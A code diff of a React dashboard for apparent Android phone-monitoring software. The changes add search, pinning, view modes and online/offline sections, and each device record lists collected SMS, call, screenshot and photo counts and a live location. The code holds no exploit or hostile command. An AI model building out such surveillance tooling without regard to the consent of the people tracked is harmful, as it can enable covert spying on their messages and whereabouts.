@@ -13,39 +13,114 @@ import {
   Globe,
   MessageSquare,
   Camera,
-  ArrowUpRight,
   Zap,
+  Star,
+  Wifi,
+  WifiOff,
+  ChevronDown,
+  ChevronRight,
+  Shield,
   Activity,
-  Users,
+  TrendingUp,
+  Clock,
+  Bell,
+  Search,
+  Filter,
+  LayoutGrid,
+  List,
   Sparkles,
 } from 'lucide-react';
 import { useRouter } from 'next/navigation';
 
+interface EnhancedDevice {
+  id: string;
+  deviceId: string;
+  model?: string;
+  manufacturer?: string;
+  androidVersion?: string;
+  isOnline: boolean;
+  lastSeen: string;
+  latestLocation?: { latitude: number; longitude: number };
+  stats?: { sms: number; calls: number; screenshots: number; photos: number };
+  isPinned?: boolean;
+  remark?: string;
+  owner?: { id: string; username: string };
+}
+
 export default function Dashboard() {
   return (
-    <Suspense fallback={null}>
+    <Suspense fallback={<DashboardSkeleton />}>
       <DashboardContent />
     </Suspense>
   );
 }
 
+function DashboardSkeleton() {
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900/20 to-slate-900">
+      <div className="flex items-center justify-center min-h-screen">
+        <div className="flex flex-col items-center gap-4">
+          <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center animate-pulse">
+            <Shield className="w-8 h-8 text-white" />
+          </div>
+          <div className="h-2 w-32 bg-white/10 rounded-full overflow-hidden">
+            <div className="h-full w-1/2 bg-gradient-to-r from-violet-500 to-purple-500 rounded-full animate-pulse" />
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
 function DashboardContent() {
   const router = useRouter();
-  const { isAuthenticated, isHydrated } = useAuthStore();
+  const { isAuthenticated, isHydrated, user } = useAuthStore();
   const { devices, setDevices, updateDevice } = useDevicesStore();
   const [loading, setLoading] = useState(true);
-  const [stats, setStats] = useState({
-    total: 0,
-    online: 0,
+  const [enhancedDevices, setEnhancedDevices] = useState<EnhancedDevice[]>([]);
+  const [aggregateStats, setAggregateStats] = useState({
     totalSms: 0,
     totalPhotos: 0,
+    totalCalls: 0,
   });
+
+  // UI States
+  const [viewMode, setViewMode] = useState<'grid' | 'list'>('grid');
+  const [searchQuery, setSearchQuery] = useState('');
+  const [expandedSections, setExpandedSections] = useState({
+    pinned: true,
+    online: true,
+    offline: false,
+  });
+
+  // Pinned devices state
+  const [pinnedDeviceIds, setPinnedDeviceIds] = useState<Set<string>>(new Set());
 
   useEffect(() => {
     if (isHydrated && !isAuthenticated) {
       router.push('/login');
     }
   }, [isHydrated, isAuthenticated, router]);
+
+  // Load pinned devices from localStorage
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const stored = localStorage.getItem('pinned_devices');
+      if (stored) {
+        try {
+          setPinnedDeviceIds(new Set(JSON.parse(stored)));
+        } catch (e) {
+          console.error('Failed to parse pinned devices:', e);
+        }
+      }
+    }
+  }, []);
+
+  const savePinnedDevices = useCallback((ids: Set<string>) => {
+    if (typeof window !== 'undefined') {
+      localStorage.setItem('pinned_devices', JSON.stringify([...ids]));
+    }
+  }, []);
 
   const fetchDevices = useCallback(async () => {
     try {
@@ -54,29 +129,57 @@ function DashboardContent() {
       const data = await getDevices();
       if (data.success) {
         setDevices(data.devices);
-        const onlineCount = data.devices.filter((d: any) => d.isOnline).length;
+
+        const devicesWithPinned: EnhancedDevice[] = data.devices.map((device: any) => ({
+          ...device,
+          isPinned: pinnedDeviceIds.has(device.deviceId),
+        }));
+
+        setEnhancedDevices(devicesWithPinned);
+
         const totalSms = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.sms || 0), 0);
         const totalPhotos = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.photos || 0) + (d.stats?.screenshots || 0), 0);
-        setStats({ total: data.devices.length, online: onlineCount, totalSms, totalPhotos });
+        const totalCalls = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.calls || 0), 0);
+        setAggregateStats({ totalSms, totalPhotos, totalCalls });
       }
     } catch (error) {
       console.error('Failed to fetch devices:', error);
     } finally {
       setLoading(false);
     }
-  }, [setDevices]);
+  }, [setDevices, pinnedDeviceIds]);
 
   useEffect(() => {
     if (isAuthenticated) {
       fetchDevices();
       const socket = connectSocket();
-      socket.on('device:online', (data) => updateDevice(data.deviceId, { isOnline: true }));
-      socket.on('device:offline', (data) => updateDevice(data.deviceId, { isOnline: false }));
-      const unsubscribeFirebase = subscribeToDeviceStatuses((statusMap) => {
-        statusMap.forEach((status, deviceId) => updateDevice(deviceId, { isOnline: status.online }));
-        const onlineCount = Array.from(statusMap.values()).filter(s => s.online).length;
-        setStats(prev => ({ ...prev, online: onlineCount }));
+
+      socket.on('device:online', (data) => {
+        updateDevice(data.deviceId, { isOnline: true });
+        setEnhancedDevices(prev =>
+          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true } : d)
+        );
       });
+      socket.on('device:offline', (data) => {
+        updateDevice(data.deviceId, { isOnline: false });
+        setEnhancedDevices(prev =>
+          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d)
+        );
+      });
+
+      const unsubscribeFirebase = subscribeToDeviceStatuses((statusMap) => {
+        setEnhancedDevices(prev =>
+          prev.map(d => {
+            const status = statusMap.get(d.deviceId);
+            if (status !== undefined) {
+              return { ...d, isOnline: status.online };
+            }
+            return d;
+          })
+        );
+        statusMap.forEach((status, deviceId) => updateDevice(deviceId, { isOnline: status.online }));
+      });
+
       return () => {
         socket.off('device:online');
         socket.off('device:offline');
@@ -85,104 +188,379 @@ function DashboardContent() {
     }
   }, [isAuthenticated, fetchDevices, updateDevice]);
 
+  useEffect(() => {
+    setEnhancedDevices(prev =>
+      prev.map(ed => {
+        const updated = devices.find(d => d.deviceId === ed.deviceId);
+        return updated ? { ...ed, ...updated, isPinned: pinnedDeviceIds.has(ed.deviceId) } : ed;
+      })
+    );
+  }, [devices, pinnedDeviceIds]);
+
+  const handlePinToggle = useCallback((deviceId: string, isPinned: boolean) => {
+    setPinnedDeviceIds(prev => {
+      const newSet = new Set(prev);
+      if (isPinned) {
+        newSet.add(deviceId);
+      } else {
+        newSet.delete(deviceId);
+      }
+      savePinnedDevices(newSet);
+      return newSet;
+    });
+
+    setEnhancedDevices(prev =>
+      prev.map(d => d.deviceId === deviceId ? { ...d, isPinned } : d)
+    );
+  }, [savePinnedDevices]);
+
+  const toggleSection = (section: 'pinned' | 'online' | 'offline') => {
+    setExpandedSections(prev => ({ ...prev, [section]: !prev[section] }));
+  };
+
   if (!isHydrated || !isAuthenticated) return null;
 
+  // Filter devices by search
+  const filteredDevices = enhancedDevices.filter(d =>
+    !searchQuery ||
+    d.model?.toLowerCase().includes(searchQuery.toLowerCase()) ||
+    d.manufacturer?.toLowerCase().includes(searchQuery.toLowerCase()) ||
+    d.deviceId.toLowerCase().includes(searchQuery.toLowerCase())
+  );
+
+  // Categorize devices
+  const pinnedDevices = filteredDevices.filter(d => pinnedDeviceIds.has(d.deviceId));
+  const onlineDevices = filteredDevices.filter(d => d.isOnline && !pinnedDeviceIds.has(d.deviceId));
+  const offlineDevices = filteredDevices.filter(d => !d.isOnline && !pinnedDeviceIds.has(d.deviceId));
+
+  const totalCount = enhancedDevices.length;
+  const onlineCount = enhancedDevices.filter(d => d.isOnline).length;
+
   const statsCards = [
-    { label: 'Devices', value: stats.total, icon: Smartphone, gradient: 'from-blue-500 to-cyan-400' },
-    { label: 'Online', value: stats.online, icon: Globe, gradient: 'from-emerald-500 to-teal-400', live: true },
-    { label: 'SMS', value: stats.totalSms.toLocaleString(), icon: MessageSquare, gradient: 'from-purple-500 to-pink-400' },
-    { label: 'Media', value: stats.totalPhotos.toLocaleString(), icon: Camera, gradient: 'from-orange-500 to-amber-400' },
+    {
+      label: 'Total Devices',
+      value: totalCount,
+      icon: Smartphone,
+      gradient: 'from-violet-500 via-purple-500 to-fuchsia-500',
+      bgGlow: 'rgba(139, 92, 246, 0.15)',
+    },
+    {
+      label: 'Online Now',
+      value: onlineCount,
+      icon: Activity,
+      gradient: 'from-emerald-400 via-green-500 to-teal-500',
+      bgGlow: 'rgba(16, 185, 129, 0.15)',
+      live: true,
+    },
+    {
+      label: 'Messages',
+      value: aggregateStats.totalSms.toLocaleString(),
+      icon: MessageSquare,
+      gradient: 'from-blue-400 via-cyan-500 to-teal-400',
+      bgGlow: 'rgba(59, 130, 246, 0.15)',
+    },
+    {
+      label: 'Media Files',
+      value: aggregateStats.totalPhotos.toLocaleString(),
+      icon: Camera,
+      gradient: 'from-orange-400 via-amber-500 to-yellow-500',
+      bgGlow: 'rgba(245, 158, 11, 0.15)',
+    },
   ];
 
   return (
-    <div className="min-h-screen bg-[var(--bg-elevated)] pb-20 lg:pb-0">
+    <div className="min-h-screen bg-[var(--bg-base)] pb-24 lg:pb-0">
       <Sidebar />
-      <main className="lg:ml-72 lg:bg-[var(--bg-base)]">
-        <Header title="Dashboard" subtitle="Welcome back to your control center" onRefresh={fetchDevices} />
+      <main className="lg:ml-72">
+        <Header title="Dashboard" subtitle="Device monitoring & control center" onRefresh={fetchDevices} />
 
-        <div className="p-3 lg:px-8 lg:py-6 lg:max-w-7xl lg:mx-auto space-y-3 lg:space-y-6">
-          {/* Stats Grid */}
-          <div className="grid grid-cols-2 gap-2 lg:gap-4">
+        <div className="p-4 lg:px-8 lg:py-6 lg:max-w-7xl lg:mx-auto space-y-6">
+
+          {/* Welcome Banner - Compact */}
+          <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-violet-600 via-purple-600 to-fuchsia-600 p-4 lg:p-8">
+            <div className="relative z-10 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-3">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 lg:w-12 lg:h-12 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center">
+                  <Shield className="w-5 h-5 lg:w-6 lg:h-6 text-white" />
+                </div>
+                <div>
+                  <h1 className="text-lg lg:text-2xl font-bold text-white leading-tight">
+                    Welcome back{user?.username ? `, ${user.username}` : ''}! 👋
+                  </h1>
+                  <p className="text-white/70 text-[11px] lg:text-sm">
+                    {onlineCount} of {totalCount} devices online
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex items-center">
+                <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
+                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
+                  <span className="text-white text-[10px] lg:text-sm font-medium tracking-tight">Live Monitoring</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Stats Grid - Compact */}
+          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 lg:gap-4">
             {statsCards.map((stat, i) => {
               const Icon = stat.icon;
               return (
-                <div key={i} className="bg-white rounded-xl p-3 lg:p-5 lg:rounded-2xl border border-[var(--border-light)] relative overflow-hidden shadow-sm">
+                <div
+                  key={stat.label}
+                  className="group relative bg-white rounded-2xl lg:rounded-3xl p-3.5 lg:p-6 border border-[var(--border-light)] shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 overflow-hidden"
+                  style={{ boxShadow: `0 4px 16px ${stat.bgGlow}` }}
+                >
                   <div className={`absolute top-0 left-0 right-0 h-1 bg-gradient-to-r ${stat.gradient}`} />
-                  <div className="flex items-center justify-between mb-2">
-                    <div className={`w-9 h-9 lg:w-12 lg:h-12 rounded-xl bg-gradient-to-br ${stat.gradient} flex items-center justify-center shadow-lg`}>
-                      <Icon className="w-4 h-4 lg:w-6 lg:h-6 text-white" />
-                    </div>
-                    {stat.live && (
-                      <div className="flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20">
-                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
-                        <span className="text-[8px] font-bold text-emerald-600">LIVE</span>
+                  <div className="relative">
+                    <div className="flex items-start justify-between mb-3 lg:mb-4">
+                      <div className={`w-10 h-10 lg:w-12 lg:h-12 rounded-xl bg-gradient-to-br ${stat.gradient} flex items-center justify-center shadow-lg shadow-purple-500/10 ${loading ? 'animate-pulse opacity-70' : ''}`}>
+                        <Icon className="w-5 h-5 lg:w-6 lg:h-6 text-white" />
                       </div>
-                    )}
+                      {stat.live && !loading && (
+                        <div className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20">
+                          <span className="relative flex h-1.5 w-1.5">
+                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                            <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500"></span>
+                          </span>
+                          <span className="text-[9px] font-bold text-emerald-600 uppercase">Live</span>
+                        </div>
+                      )}
+                    </div>
+
+                    <div>
+                      {loading ? (
+                        <div className="h-8 lg:h-10 w-24 bg-slate-100 rounded-lg animate-pulse mb-2" />
+                      ) : (
+                        <p className="text-2xl lg:text-4xl font-extrabold text-[var(--text-primary)] tracking-tight">
+                          {stat.value}
+                        </p>
+                      )}
+                      <p className="text-[11px] lg:text-sm font-medium text-[var(--text-muted)] mt-0.5">
+                        {stat.label}
+                      </p>
+                    </div>
                   </div>
-                  <p className="text-xl lg:text-3xl font-bold text-[var(--text-primary)]">{stat.value}</p>
-                  <p className="text-[10px] lg:text-xs font-semibold text-[var(--text-muted)] uppercase">{stat.label}</p>
                 </div>
               );
             })}
           </div>
 
-          {/* Quick Actions */}
-          <div className="bg-white rounded-xl p-3 lg:rounded-2xl border border-[var(--border-light)] shadow-sm">
-            <div className="flex items-center gap-3 mb-3">
-              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[var(--aurora-violet)] to-[var(--aurora-purple)] flex items-center justify-center">
-                <Sparkles className="w-4 h-4 text-white" />
-              </div>
-              <span className="font-bold text-sm text-[var(--text-primary)]">Quick Actions</span>
+          {/* Search and Filter Bar */}
+          <div className="flex flex-col sm:flex-row gap-3">
+            <div className="flex-1 relative">
+              <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-[var(--text-muted)]" />
+              <input
+                type="text"
+                placeholder="Search devices by name, model, or ID..."
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+                className="w-full pl-12 pr-4 py-3 bg-white border border-[var(--border-light)] rounded-xl text-[var(--text-primary)] placeholder:text-[var(--text-muted)] focus:outline-none focus:ring-2 focus:ring-[var(--primary)]/20 focus:border-[var(--primary)] transition-all"
+              />
             </div>
-            <div className="grid grid-cols-3 gap-2">
-              <button className="flex items-center justify-center gap-1.5 py-2.5 rounded-lg bg-[var(--bg-subtle)] border border-[var(--border-light)] text-[var(--text-secondary)]">
-                <Users className="w-4 h-4" />
+            <div className="flex gap-2">
+              <button
+                onClick={() => setViewMode('grid')}
+                className={`p-3 rounded-xl border transition-all ${viewMode === 'grid'
+                  ? 'bg-[var(--primary)] border-[var(--primary)] text-white'
+                  : 'bg-white border-[var(--border-light)] text-[var(--text-muted)] hover:border-[var(--primary)]'
+                  }`}
+              >
+                <LayoutGrid className="w-5 h-5" />
               </button>
-              <button className="flex items-center justify-center gap-1.5 py-2.5 rounded-lg bg-[var(--bg-subtle)] border border-[var(--border-light)] text-[var(--text-secondary)]">
-                <Activity className="w-4 h-4" />
-              </button>
-              <button className="flex items-center justify-center gap-1.5 py-2.5 rounded-lg bg-gradient-to-r from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white shadow-lg">
-                <Zap className="w-4 h-4" />
+              <button
+                onClick={() => setViewMode('list')}
+                className={`p-3 rounded-xl border transition-all ${viewMode === 'list'
+                  ? 'bg-[var(--primary)] border-[var(--primary)] text-white'
+                  : 'bg-white border-[var(--border-light)] text-[var(--text-muted)] hover:border-[var(--primary)]'
+                  }`}
+              >
+                <List className="w-5 h-5" />
               </button>
             </div>
           </div>
 
-          {/* Devices Section */}
-          <div>
-            <div className="flex items-center gap-3 mb-3 lg:mb-4">
-              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[var(--aurora-violet)] to-[var(--aurora-purple)] flex items-center justify-center">
-                <Smartphone className="w-4 h-4 text-white" />
-              </div>
-              <div>
-                <h2 className="font-bold text-sm text-[var(--text-primary)]">Your Devices</h2>
-                <p className="text-[10px] text-[var(--text-muted)]">{devices.length} registered</p>
-              </div>
+          {/* Device Sections */}
+          {loading ? (
+            <div className="space-y-4">
+              {[1, 2, 3].map((i) => (
+                <div key={i} className="h-48 rounded-2xl bg-white/50 animate-pulse" />
+              ))}
             </div>
-
-            {loading ? (
-              <div className="space-y-2 lg:grid lg:grid-cols-2 xl:grid-cols-3 lg:gap-4 lg:space-y-0">
-                {[1, 2, 3].map((i) => (
-                  <div key={i} className="h-32 lg:h-48 rounded-xl lg:rounded-2xl bg-[var(--bg-subtle)] skeleton" />
-                ))}
+          ) : filteredDevices.length === 0 ? (
+            <div className="bg-white rounded-2xl p-6 lg:p-12 text-center border border-[var(--border-light)]">
+              <div className="w-16 h-16 lg:w-20 lg:h-20 mx-auto mb-4 lg:mb-6 rounded-2xl bg-gradient-to-br from-violet-500/10 to-purple-500/10 flex items-center justify-center">
+                <Smartphone className="w-8 h-8 lg:w-10 lg:h-10 text-[var(--primary)]" />
               </div>
-            ) : devices.length === 0 ? (
-              <div className="bg-white rounded-xl p-8 text-center border border-[var(--border-light)] shadow-sm">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-xl bg-[var(--bg-subtle)] flex items-center justify-center">
-                  <Smartphone className="w-8 h-8 text-[var(--text-muted)]" />
+              <h3 className="font-bold text-lg lg:text-xl text-[var(--text-primary)] mb-2">
+                {searchQuery ? 'No devices found' : 'No Devices Connected'}
+              </h3>
+              <p className="text-[var(--text-muted)] mb-6 max-w-md mx-auto">
+                {searchQuery
+                  ? `No devices match "${searchQuery}". Try a different search term.`
+                  : 'Install the monitoring app on a device to get started with real-time tracking.'}
+              </p>
+              {!searchQuery && (
+                <div className="inline-flex items-center gap-2 px-5 py-3 rounded-xl bg-gradient-to-r from-violet-500 to-purple-600 text-white font-medium shadow-lg shadow-purple-500/25">
+                  <Sparkles className="w-5 h-5" />
+                  <span>Waiting for connections...</span>
                 </div>
-                <h3 className="font-bold text-lg text-[var(--text-primary)] mb-2">No Devices</h3>
-                <p className="text-sm text-[var(--text-muted)]">Install the app to start monitoring</p>
-              </div>
-            ) : (
-              <div className="space-y-2 lg:grid lg:grid-cols-2 xl:grid-cols-3 lg:gap-4 lg:space-y-0">
-                {devices.map((device) => (
-                  <DeviceCard key={device.id} device={device} />
-                ))}
-              </div>
-            )}
-          </div>
+              )}
+            </div>
+          ) : (
+            <div className="space-y-12 pb-20">
+              {/* Pinned Devices */}
+              {pinnedDevices.length > 0 && (
+                <DeviceSection
+                  title="Pinned Devices"
+                  count={pinnedDevices.length}
+                  icon={Star}
+                  gradient="from-amber-500 to-orange-500"
+                  expanded={expandedSections.pinned}
+                  onToggle={() => toggleSection('pinned')}
+                  devices={pinnedDevices}
+                  viewMode={viewMode}
+                  onPinToggle={handlePinToggle}
+                />
+              )}
+
+              {/* Online Devices */}
+              <DeviceSection
+                title="Online Devices"
+                count={onlineDevices.length}
+                icon={Wifi}
+                gradient="from-emerald-500 to-teal-500"
+                expanded={expandedSections.online}
+                onToggle={() => toggleSection('online')}
+                devices={onlineDevices}
+                viewMode={viewMode}
+                onPinToggle={handlePinToggle}
+                live={onlineDevices.length > 0}
+                emptyMessage="No devices currently online"
+                emptyIcon={WifiOff}
+              />
+
+              {/* Offline Devices */}
+              <DeviceSection
+                title="Offline Devices"
+                count={offlineDevices.length}
+                icon={WifiOff}
+                gradient="from-slate-400 to-gray-500"
+                expanded={expandedSections.offline}
+                onToggle={() => toggleSection('offline')}
+                devices={offlineDevices}
+                viewMode={viewMode}
+                onPinToggle={handlePinToggle}
+                emptyMessage="All devices are currently online!"
+                emptyIcon={Wifi}
+              />
+            </div>
+          )}
         </div>
       </main>
+    </div>
+  );
+}
+
+// Device Section Component
+function DeviceSection({
+  title,
+  count,
+  icon: Icon,
+  gradient,
+  expanded,
+  onToggle,
+  devices,
+  viewMode,
+  onPinToggle,
+  live = false,
+  emptyMessage,
+  emptyIcon: EmptyIcon,
+}: {
+  title: string;
+  count: number;
+  icon: any;
+  gradient: string;
+  expanded: boolean;
+  onToggle: () => void;
+  devices: EnhancedDevice[];
+  viewMode: 'grid' | 'list';
+  onPinToggle: (deviceId: string, isPinned: boolean) => void;
+  live?: boolean;
+  emptyMessage?: string;
+  emptyIcon?: any;
+}) {
+  return (
+    <div className="space-y-6">
+      {/* Section Header as a Label */}
+      <div className="flex items-center justify-between px-2">
+        <div className="flex items-center gap-4">
+          <div className={`w-1.5 h-8 rounded-full bg-gradient-to-b ${gradient} shadow-sm shadow-black/5`} />
+          <div className="text-left">
+            <div className="flex items-center gap-2">
+              <h2 className="text-lg lg:text-xl font-bold text-[var(--text-primary)] tracking-tight">{title}</h2>
+              {live && (
+                <span className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-600 text-[10px] font-black uppercase tracking-wider">
+                  <span className="relative flex h-1.5 w-1.5">
+                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                    <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500"></span>
+                  </span>
+                  Live
+                </span>
+              )}
+            </div>
+            <p className="text-[10px] lg:text-xs font-black text-[var(--text-muted)] uppercase tracking-[0.1em] opacity-80">
+              {count} Device{count !== 1 ? 's' : ''} Connected
+            </p>
+          </div>
+        </div>
+
+        <button
+          onClick={onToggle}
+          className={`group flex items-center gap-2 px-4 py-2 rounded-xl transition-all duration-300 border ${expanded
+              ? 'bg-slate-900 border-slate-900 text-white shadow-lg shadow-slate-900/10'
+              : 'bg-white border-slate-200 text-slate-500 hover:border-slate-300 hover:text-slate-900'
+            }`}
+        >
+          <span className="text-xs font-bold uppercase tracking-widest hidden sm:inline">
+            {expanded ? 'Hide List' : 'Show List'}
+          </span>
+          <div className={`transition-transform duration-300 ${expanded ? 'rotate-180' : ''}`}>
+            <ChevronDown className="w-4 h-4" />
+          </div>
+        </button>
+      </div>
+
+      {/* Section Content */}
+      {expanded && (
+        <div className="transition-all duration-500 animate-slide-up">
+          {devices.length > 0 ? (
+            <div className={viewMode === 'grid'
+              ? 'grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 lg:gap-6'
+              : 'space-y-3'
+            }>
+              {devices.map((device) => (
+                <DeviceCard
+                  key={device.id}
+                  device={device}
+                  showPin={true}
+                  showRemark={true}
+                  onPinToggle={onPinToggle}
+                  compact={viewMode === 'list'}
+                />
+              ))}
+            </div>
+          ) : emptyMessage && EmptyIcon ? (
+            <div className="bg-white/40 rounded-[2rem] border border-dashed border-slate-200 py-12 text-center">
+              <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-slate-50 flex items-center justify-center text-slate-300">
+                <EmptyIcon className="w-8 h-8 opacity-50" />
+              </div>
+              <p className="text-sm font-medium text-slate-500">{emptyMessage}</p>
+            </div>
+          ) : null}
+        </div>
+      )}
     </div>
   );
 }
